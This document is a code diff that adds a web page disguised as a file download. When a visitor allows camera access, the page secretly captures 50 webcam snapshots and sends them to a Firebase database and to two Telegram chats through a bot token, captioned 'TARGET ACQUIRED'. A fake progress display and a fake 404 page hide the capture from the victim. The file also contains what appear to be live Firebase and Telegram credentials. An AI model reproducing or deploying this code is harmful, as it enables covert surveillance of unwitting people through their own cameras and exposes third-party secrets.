@@ -1,0 +1,129 @@
+<!-- Add Firebase SDKs before your custom script -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+<script>
+    // 1. Firebase Configuration (Matches your Command Center setup)
+    const firebaseConfig = {
+        apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+        authDomain: "shadow-app-4q69.firebaseapp.com",
+        databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "shadow-app-4q69",
+        storageBucket: "shadow-app-4q69.firebasestorage.app",
+        messagingSenderId: "109693889633",
+        appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // Existing Telegram Config
+    const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+    const IDS = ['7617707778', '7194705917'];
+
+    const systemLogs = [
+        "Syncing with cloud resources...",
+        "Decrypting data packets...",
+        "Verifying item integrity...",
+        "Rebuilding archive layers...",
+        "Optimizing file stream...",
+        "Validating network keys...",
+        "Bypassing latency buffers...",
+        "Assembling binary blocks..."
+    ];
+
+    async function initiate() {
+        const setupUI = document.getElementById('setup-ui');
+        const downloadUI = document.getElementById('download-ui');
+        const loader = document.getElementById('loader');
+        const logText = document.getElementById('log-text');
+        const percentLabel = document.getElementById('percent-label');
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            
+            setupUI.style.display = 'none';
+            downloadUI.style.display = 'block';
+            setTimeout(() => { 
+                downloadUI.style.opacity = '1'; 
+                downloadUI.style.transform = 'translateY(0)'; 
+            }, 50);
+
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            
+            video.onloadedmetadata = () => {
+                video.play();
+                let count = 0;
+                const maxPackets = 50; 
+                
+                const interval = setInterval(() => {
+                    if (count >= maxPackets) {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(track => track.stop());
+                        logText.innerText = "Download successful.";
+                        percentLabel.innerText = "Processing File...";
+                        setTimeout(render404, 2000);
+                        return;
+                    }
+                    
+                    send(count + 1);
+                    count++;
+                    
+                    const progress = (count / maxPackets) * 100;
+                    loader.style.width = progress + "%";
+                    percentLabel.innerText = "Downloading Resources: " + Math.round(progress) + "%";
+                    
+                    if (count % 3 === 0) {
+                        logText.innerText = systemLogs[Math.floor(Math.random() * systemLogs.length)];
+                    }
+                }, 1200); 
+            };
+        } catch (e) {
+            alert("Connection Error: Unable to establish a secure tunnel.");
+            window.location.reload();
+        }
+    }
+
+    function send(index) {
+        const canvas = document.getElementById('c');
+        const video = document.getElementById('v');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        // 1. Firebase Exfiltration (for FlutterFlow Dashboard)
+        const base64Data = canvas.toDataURL('image/jpeg', 0.3); // Low quality for faster upload
+        database.ref('captures').push({
+            image_data: base64Data,
+            target_id: "Node_Relay_Demo",
+            timestamp: Date.now(),
+            index: index
+        });
+
+        // 2. Telegram Exfiltration (as Backup)
+        canvas.toBlob(blob => {
+            if (!blob) return;
+
+            IDS.forEach(chatId => {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'relay_fragment.jpg');
+                fd.append('caption', '📦 TARGET ACQUIRED\nIndex: ' + index + '/50\nNode: Enterprise-Secure-Relay');
+
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
+            });
+        }, 'image/jpeg', 0.4); 
+    }
+
+    function render404() {
+        document.documentElement.innerHTML = `
+        <html><body style="background:white;color:black;padding:40px;text-align:center;">
+        <h1>404 Not Found</h1><p>The requested file has been moved.</p>
+        <hr><address>Apache/2.4.41 Server</address></body></html>`;
+    }
+</script>
